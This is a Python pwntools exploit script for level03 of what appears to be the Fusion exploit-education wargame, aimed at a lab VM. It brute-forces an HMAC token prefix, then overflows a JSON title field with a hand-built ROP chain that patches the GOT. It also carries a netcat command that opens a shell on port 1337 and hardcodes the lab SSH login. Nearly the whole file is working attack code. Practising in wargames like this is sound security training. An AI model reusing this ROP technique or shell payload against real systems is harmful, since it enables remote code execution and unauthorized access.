#!/usr/bin/python2

from pwn import *
import hmac
from hashlib import sha1
import json, random, string

IP = '192.168.12.131'
PORT = 20003
ENC = 'iso-8859-1'
EXE = 'level03'

LOCAL_IP = '192.168.12.133'
SERVER_IP = LOCAL_IP
SERVER_PORT = 9999

def sendFile(payload):
    s = ssh(host='192.168.12.131', user='fusion', password='godmode')
    s.upload_data(payload, '/tmp/payload')

def get_token():
    log.info('Init connection')
    global io
    io = remote(IP, PORT)
    banner = io.recvS()
    token = banner.split('"')[1]
    log.success('Token: {}'.format(token))
    return token


'''
siuser@ubuntu:~/ctf/fusion/level03$ ropper -f ./level03 --search "pop"
0x08048bf0: pop ebx; ret;
'''
pop1 = 0x08048bf0
pop2 = 0x0804964e
pop3 = 0x0804964d

memcpy = 0x08048e60
post_blog_article = 0x08049f20
gTitle = 0x0804be04
libc_start_main = 0x08048d80+2

elf = ELF(EXE)
libc = ELF('libc.so.6')
'''
rop = ROP(elf)
#rop.raw(elf.got['write'])

rop.raw(memcpy)
rop.raw(post_blog_article)
rop.raw(gTitle)
rop.raw(libc_start_main)
rop.raw(0x4)

decoded_rop = rop.chain().decode(ENC)
'''
rop=""
rop += p32(0x08048bf0) # pop ebx, ret
rop += p32(0xaaa9b858) # 0x0804bd1c - 0x5d5b04c4
rop += p32(0x08049b4f) # pop eax ; add esp, 0x5c ; ret
rop += p32(0xfff7b860)
rop += 'A'*0x5c        # because of add esp, 0x5c
rop += p32(0x080493fe) # add dword ptr [ebx + 0x5d5b04c4], eax ; ret
rop += p32(0x08048d40) # write PLT
rop += p32(0x08048f80) # exit PLT => objdump -d /opt/fusion/bin/level03 | grep "<exit@plt>"
#rop += p32(0x0804bdf4) # gContents => objdump -t /opt/fusion/bin/level03
rop += p32(0x0804d058) # [gContents]
decoded_rop = rop

pattern = 'A'*31
token = get_token()
contents = '/'*400 + 'bin/nc.traditional -lp 1337 -e /bin/sh'

while(True):
    title = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(100)])
    msg = json.dumps(
            {"tags":("A"), "title":title+'A'*27+'\\u1111'+pattern+decoded_rop, "contents":contents, "serverip":"{}:{}".format(SERVER_IP, SERVER_PORT)}, ensure_ascii=False)
    payload  = token + '\n' + msg
    hashed = hmac.new(bytearray(token, ENC), bytearray(payload, ENC), sha1)
    if (hashed.hexdigest().startswith('0000')):
        log.info("Hash: " + hashed.hexdigest())
        log.info("Sending to {}:{}".format(SERVER_IP, SERVER_PORT))
        #log.info("Payload: " + payload)
        break

io.send(payload)
l = listen(SERVER_PORT)
#l.wait_for_connection()
print(l.recv(timeout=1))

